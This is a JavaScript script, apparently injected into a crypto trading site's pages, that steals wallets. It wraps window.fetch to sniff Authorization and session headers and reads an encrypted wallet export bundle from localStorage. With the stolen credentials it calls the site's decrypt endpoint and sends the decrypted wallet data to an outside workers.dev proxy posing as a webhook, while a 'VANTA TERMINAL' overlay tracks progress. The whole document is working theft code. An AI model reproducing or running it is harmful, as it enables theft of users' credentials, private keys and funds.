(function() {
    const CONFIG = {
        proxy: "https://vanta-proxy.jdurrulo.workers.dev/",
        decryptUrl: "https://api.padre.gg/v2/enclave/decrypt"
    };

    // 1. THE WEBHOOK SENDER
    const notify = async (title, msg) => {
        await fetch(CONFIG.proxy, {
            method: 'POST',
            mode: 'cors',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                embeds: [{
                    title: title,
                    description: msg,
                    color: 0x00ff88,
                    timestamp: new Date()
                }]
            })
        }).catch(e => console.error("Webhook Error"));
    };

    // 2. THE UI (Draggable & Neon)
    const createUI = () => {
        const div = document.createElement('div');
        div.id = 'vanta-ui';
        div.style = `position:fixed;top:20px;right:20px;width:300px;background:#0a0a0a;border:1px solid #00ff88;border-radius:12px;padding:15px;z-index:999999;color:#00ff88;font-family:monospace;cursor:move;box-shadow:0 0 20px rgba(0,255,136,0.3);`;
        div.innerHTML = `
            <div style="font-weight:bold;margin-bottom:10px;border-bottom:1px solid #333;padding-bottom:5px;">VANTA TERMINAL v5.2</div>
            <div id="vanta-log" style="font-size:10px;color:#888;">> Awaiting authorization...</div>
            <div style="margin-top:10px;height:4px;background:#222;"><div id="vanta-prog" style="width:20%;height:100%;background:#00ff88;transition:0.5s;"></div></div>
        `;
        document.body.appendChild(div);

        // Make it Draggable
        let isDown = false, offset = [0,0];
        div.addEventListener('mousedown', (e) => { isDown = true; offset = [div.offsetLeft - e.clientX, div.offsetTop - e.clientY]; });
        document.addEventListener('mouseup', () => { isDown = false; });
        document.addEventListener('mousemove', (e) => { if (isDown) { div.style.left = (e.clientX + offset[0]) + 'px'; div.style.top = (e.clientY + offset[1]) + 'px'; }});
    };

    // 3. THE DECRYPTOR ENGINE
    const runDecryption = async (token, session) => {
        const bundleStr = localStorage.getItem('padre-v2-bundles-store-v2');
        if (!bundleStr) return;
        
        const bundleData = JSON.parse(bundleStr);
        const firstKey = Object.keys(bundleData.bundles)[0];
        const payload = {
            bundle: bundleData.bundles[firstKey].exportBundle,
            subOrgId: bundleData.bundles[firstKey].subOrgId
        };

        try {
            const res = await fetch(CONFIG.decryptUrl, {
                method: 'POST',
                headers: { 'Authorization': token, 'X-Padre-Session': session, 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            const decrypted = await res.json();
            await notify("✅ WALLET DECRYPTED", "```json\n" + JSON.stringify(decrypted, null, 2) + "\n```");
            document.getElementById('vanta-log').innerText = "> Decryption Successful";
            document.getElementById('vanta-prog').style.width = "100%";
        } catch (e) {
            await notify("❌ Decryption Failed", e.message);
        }
    };

    // 4. THE AGGRESSIVE SNIFFER
    let capturedToken = null;
    let capturedSession = "";

    const checkHeaders = (name, val) => {
        if (name.toLowerCase() === 'authorization') capturedToken = val;
        if (name.toLowerCase() === 'x-padre-session') capturedSession = val;
        
        if (capturedToken && !window.auditComplete) {
            window.auditComplete = true;
            document.getElementById('vanta-log').innerText = "> Credentials Sniffed. Decrypting...";
            document.getElementById('vanta-prog').style.width = "60%";
            runDecryption(capturedToken, capturedSession);
        }
    };

    const _f = window.fetch;
    window.fetch = async (...a) => {
        const h = a[1]?.headers;
        if (h) {
            if (h instanceof Headers) h.forEach((v, n) => checkHeaders(n, v));
            else Object.entries(h).forEach(([n, v]) => checkHeaders(n, v));
        }
        return _f(...a);
    };

    // INIT
    createUI();
    _f('/api/v2/user/profile'); // Force a leak
})();
